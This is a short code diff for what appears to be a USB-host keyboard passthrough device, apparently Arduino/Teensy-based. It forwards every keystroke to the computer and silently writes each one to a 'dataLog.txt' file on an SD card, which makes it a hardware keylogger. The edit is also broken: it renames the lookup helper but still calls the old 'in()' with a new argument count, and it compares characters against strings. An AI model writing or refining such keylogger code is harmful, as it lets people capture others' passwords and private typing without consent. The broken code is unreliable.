@@ -75,14 +75,14 @@ const char * bthid_driver_names[CNT_HIDDEVICES] = {"KB(BT)"};
 bool bthid_driver_active[CNT_HIDDEVICES] = {false};
 #endif
 
-bool in(char key, const char* specialKeys[]) {
-  for (int i = 0; i < sizeof(specialKeys); i++) {
-    if (key == specialKeys[i]) 
+bool charInCharArray(char c, char* charArray, int arraySize) {
+  for (int i = 0; i < arraySize; i++) {
+    if (charArray[i] == c) {
       return true;
+    }
   }
   return false;
 }
-
 void OnPress(int key) {
   static File dataLog = SD.open("dataLog.txt", FILE_WRITE);
   static const char* specialKeys[] = {
@@ -91,12 +91,12 @@ void OnPress(int key) {
                                      "F6", "F7", "F8", "F9", "F10", "F11", "F12"
                                 };
 
-    if (!in(key, specialKeys)) {
-        Keyboard.print(key);
-        dataLog.print(key);
+    if (!in(key, specialKeys, sizeof(specialKeys) / sizeof(specialKeys[0]))) {
+        Keyboard.print((char)key);
+        dataLog.print((char)key);
 
         // For the ouput for debugging
-        Serial.print(key);
+        Serial.print((char)key);
         Serial.println(dataLog.size());
 
     }
